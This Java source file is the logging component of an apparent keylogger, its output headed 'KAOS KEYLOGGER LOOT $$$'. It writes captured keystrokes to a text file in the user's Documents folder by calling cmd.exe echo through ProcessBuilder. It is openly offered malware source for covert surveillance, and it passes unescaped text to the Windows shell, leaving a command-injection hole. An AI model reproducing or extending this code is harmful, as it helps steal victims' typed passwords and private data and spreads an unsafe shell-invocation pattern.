package org.example;

import org.example.Exceptions.FilenameException;

import java.io.IOException;

public class TextWriter {

    private String filename;
    private String username = System.getProperty("user.name");

    private TextWriter(String file) {
        this.filename = file;
        createTxt(filename);
    }

    public static TextWriter TextWriterMaker(String filename) throws FilenameException {
        if (filename.length() > 15){
            throw new FilenameException();
        }else {
            return new TextWriter(filename);
        }
    }

    public void createTxt(String name){

        ProcessBuilder create = new ProcessBuilder
                ("cmd.exe","/c","echo","KAOS KEYLOGGER LOOT $$$",">>","C:\\Users\\" +
                         username +"\\Documents\\" + name + ".txt");

        try {
            create.start();
            filename = name;
        } catch (IOException e) {
            System.out.println("ERROR IN FILE CREATION" +e.getMessage());
            System.exit(0);
        }
    }
    public void saveText(String text){
        ProcessBuilder append = new ProcessBuilder
                ("cmd.exe","/c","echo",text,">>","C:\\Users\\" +
                        username +"\\Documents\\" + filename + ".txt");
        try {
            append.start();
        } catch (IOException e) {
            System.out.println("ERROR IN FILE KEYS SAVING");
            System.exit(0);
        }
    }
}
